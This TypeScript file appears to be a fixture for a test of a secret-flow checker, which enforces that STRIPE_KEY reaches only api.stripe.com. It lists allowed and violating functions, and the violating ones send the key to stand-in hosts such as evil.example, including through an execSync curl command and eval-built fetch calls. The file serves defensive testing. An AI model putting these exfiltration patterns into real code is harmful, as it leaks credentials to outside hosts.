// Used by test/flows.test.ts, with the rule: env(STRIPE_KEY) may only go to net(api.stripe.com).
import { execSync } from "node:child_process";

/** @perm env(STRIPE_KEY), net(api.stripe.com), net(analytics.example) */
export async function charge(amount: number) {
  const key = process.env.STRIPE_KEY;
  await fetch("https://api.stripe.com/v1/charges", { method: "POST", headers: { authorization: `Bearer ${key}` } });
  await track(amount);
}

function track(amount: number) {
  return fetch("https://analytics.example/event", { method: "POST", body: String(amount) });
}

/** Reads the key and sends to whatever URL it's given. */
export async function relay(url: string) {
  const key = process.env.STRIPE_KEY;
  return fetch(url, { headers: { key: key ?? "" } });
}

/** Sends the whole environment, the key included. */
export async function dumpAll() {
  return fetch("https://logs.example/env", { method: "POST", body: JSON.stringify(process.env) });
}

/** Only ever talks to Stripe: allowed. */
export async function stripeOnly() {
  const key = process.env.STRIPE_KEY;
  return fetch("https://api.stripe.com/v1/balance", { headers: { authorization: `Bearer ${key}` } });
}

/** Reads a different variable: the rule doesn't apply. */
export async function other() {
  const token = process.env.OTHER_TOKEN;
  return fetch("https://analytics.example/event", { headers: { token: token ?? "" } });
}

/**
 * Calls a function that uses the key and returns what Stripe sent back. Without following
 * the value, that result could carry the key, so this is flagged too.
 */
export async function dashboard() {
  await stripeOnly();
  return fetch("https://analytics.example/view");
}

// --- Ways the key reaches a function other than reading it there.

/** Returns the key (or undefined): whoever calls it has the key. */
function stripeKey() {
  return process.env.STRIPE_KEY;
}

/** Gets the key from a getter and sends it elsewhere. */
export async function viaGetter() {
  await fetch("https://evil.example/collect", { method: "POST", body: stripeKey() ?? "" });
}

/** A field holding a function that returns the key. */
class Keys {
  stripe = () => process.env.STRIPE_KEY ?? "";
}

export async function viaField(keys: Keys) {
  await fetch("https://evil.example/field", { method: "POST", body: keys.stripe() });
}

/** Hands the key to a callback, which the caller writes. */
function withKey(use: (key: string) => void) {
  use(process.env.STRIPE_KEY!);
}

export function viaCallback() {
  withKey((key) => void fetch("https://evil.example/cb", { method: "POST", body: key }));
}

/** An object built with the key carries it. */
class StripeClient {
  key = process.env.STRIPE_KEY;
}

export async function viaClient() {
  const client = new StripeClient();
  await fetch("https://evil.example/client", { method: "POST", body: client.key });
}

/** A command or code that can't be verified can send the key anywhere. */
export function viaExec() {
  execSync("curl -d " + process.env.STRIPE_KEY + " https://evil.example");
}

export function viaEval() {
  const key = process.env.STRIPE_KEY;
  eval("fetch('https://evil.example/?k=" + key + "')");
}

/** Uses the key only to call Stripe, and returns nothing: its callers never have the key. */
async function chargeOnly(amount: number): Promise<void> {
  const key = process.env.STRIPE_KEY;
  await fetch("https://api.stripe.com/v1/charges", { method: "POST", headers: { authorization: `Bearer ${key}` }, body: String(amount) });
}

export async function checkout(amount: number) {
  await chargeOnly(amount);
  await fetch("https://analytics.example/checkout");
}

/** A setter can't hand anything back to the code that assigns to it. */
const settings = {
  set level(value: number) {
    void fetch("https://api.stripe.com/v1/log", { method: "POST", headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` }, body: String(value) });
  },
};

export async function configure() {
  settings.level = 2;
  await fetch("https://analytics.example/configured");
}

/** Records a refund with Stripe, synchronously or not: it returns nothing either way. */
function audit(amount: number): void | Promise<void> {
  if (amount > 1000) return fetch("https://api.stripe.com/v1/audit", { headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` } }).then(() => {});
}

export async function refund(amount: number) {
  await audit(amount);
  await fetch("https://analytics.example/refund");
}

/** @perm-unsafe reason:"template compiler, trusted templates only" */
function render(template: string): unknown {
  return eval(template);
}

/** @perm-unsafe accepts render's eval for annotations, but it runs whatever it's given, the key included. */
export function viaUnsafe() {
  const key = process.env.STRIPE_KEY;
  render("fetch('https://evil.example/?k=" + key + "')");
}

// --- Data handed back through an object the caller passes in.

/** Writes the key into the headers it's given: its caller then has the key. */
function authorize(headers: Record<string, string>): void {
  headers.authorization = `Bearer ${process.env.STRIPE_KEY}`;
}

export async function viaHeaders() {
  const headers: Record<string, string> = {};
  authorize(headers);
  await fetch("https://evil.example/report", { method: "POST", headers });
}

/** Hands the key to a method of the object it's given. */
function loadInto(store: Map<string, string>): void {
  store.set("key", process.env.STRIPE_KEY!);
}

export async function viaStore() {
  const store = new Map<string, string>();
  loadInto(store);
  await fetch("https://evil.example/store", { method: "POST", body: store.get("key") });
}

interface Order {
  id: string;
  total: number;
  lines: { sku: string; note?: string }[];
}

/** Writes the key into the elements of a list it's given, through a callback. */
function tagLines({ lines }: Order): void {
  lines.forEach((line) => {
    line.note = process.env.STRIPE_KEY;
  });
}

export async function viaElements(order: Order) {
  tagLines(order);
  await fetch("https://evil.example/lines", { method: "POST", body: JSON.stringify(order) });
}

/** Only reads what it's given, and returns nothing: nothing comes back to its caller. */
async function chargeOrder(order: Order): Promise<void> {
  if (!order || order.total <= 0) return;
  const skus = order.lines.map((line) => line.sku).join(",");
  await fetch("https://api.stripe.com/v1/charges", {
    method: "POST",
    headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` },
    body: `${order.id}:${order.total}:${skus}:${order.id.toUpperCase()}`,
  });
}

export async function checkoutOrder(order: Order) {
  await chargeOrder(order);
  await fetch("https://analytics.example/checkout");
}

/** A logger that takes a string can't hand anything back. */
function logCharge(message: string): void {
  void fetch("https://api.stripe.com/v1/log", { method: "POST", headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` }, body: message });
}

export async function logged() {
  logCharge("charged");
  await fetch("https://analytics.example/logged");
}
